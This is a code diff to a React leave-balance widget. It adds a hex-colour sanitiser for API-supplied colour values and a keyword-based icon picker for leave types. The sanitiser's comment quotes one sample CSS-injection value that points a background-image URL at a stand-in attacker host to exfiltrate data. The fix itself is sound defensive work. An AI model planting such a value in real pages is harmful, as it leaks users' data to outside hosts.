@@ -9,6 +9,47 @@ import { cn } from '@aquaculture/shared-ui';
 import { useLeaveBalanceSummary } from '../../hooks';
 import { LeaveCategory, LEAVE_CATEGORY_CONFIG } from '../../types';
 
+// ============================================================================
+// SEC-006: Color code sanitisation
+// ============================================================================
+
+/**
+ * Validates that a color string from the API is a safe hex color before
+ * using it in an inline `style` prop.
+ *
+ * Accepts: #RGB, #RRGGBB, #RRGGBBAA (3, 6, or 8 hex digits).
+ * Rejects any other value and falls back to `fallback` (default indigo).
+ *
+ * Background: React's JSX does not sanitise CSS property values.  While
+ * modern browsers block JS execution via `style`, a crafted colorCode such as
+ * `red; background-image: url(//evil.com/?)` enables CSS-exfiltration attacks.
+ */
+const HEX_COLOR_RE = /^#[0-9A-Fa-f]{3}(?:[0-9A-Fa-f]{3}(?:[0-9A-Fa-f]{2})?)?$/;
+
+export function sanitizeColor(value: string | null | undefined, fallback = '#6366f1'): string {
+  if (value && HEX_COLOR_RE.test(value)) return value;
+  return fallback;
+}
+
+// BUG-004: derive a best-effort icon from leave type name keywords rather than
+// always falling back to LeaveCategory.ANNUAL.
+function guessIconForLeaveType(leaveTypeName: string): React.ReactNode {
+  const name = leaveTypeName.toLowerCase();
+  if (name.includes('sick') || name.includes('hastalık') || name.includes('hastalik')) {
+    return <Thermometer className="h-4 w-4" />;
+  }
+  if (name.includes('shore') || name.includes('rotation') || name.includes('anchor')) {
+    return <Anchor className="h-4 w-4" />;
+  }
+  if (name.includes('unpaid') || name.includes('compensat') || name.includes('overtime')) {
+    return <Clock className="h-4 w-4" />;
+  }
+  if (name.includes('annual') || name.includes('yıllık') || name.includes('yillik')) {
+    return <Sun className="h-4 w-4" />;
+  }
+  return <Calendar className="h-4 w-4" />;
+}
+
 interface LeaveBalanceWidgetProps {
   employeeId: string;
   year?: number;
@@ -139,10 +180,10 @@ export function LeaveBalanceWidget({
               <div className="flex items-center gap-2">
                 <div
                   className="flex h-8 w-8 items-center justify-center rounded-lg"
-                  style={{ backgroundColor: `${balance.leaveTypeColor}20` }}
+                  style={{ backgroundColor: `${sanitizeColor(balance.leaveTypeColor)}20` }}
                 >
-                  <span style={{ color: balance.leaveTypeColor }}>
-                    {categoryIcons[LeaveCategory.ANNUAL]}
+                  <span style={{ color: sanitizeColor(balance.leaveTypeColor) }}>
+                    {guessIconForLeaveType(balance.leaveTypeName)}
                   </span>
                 </div>
                 <span className="font-medium text-gray-900 dark:text-white">
@@ -162,7 +203,7 @@ export function LeaveBalanceWidget({
                 used={balance.used}
                 pending={balance.pending}
                 entitled={balance.entitled}
-                color={balance.leaveTypeColor}
+                color={sanitizeColor(balance.leaveTypeColor)}
               />
             </div>
 
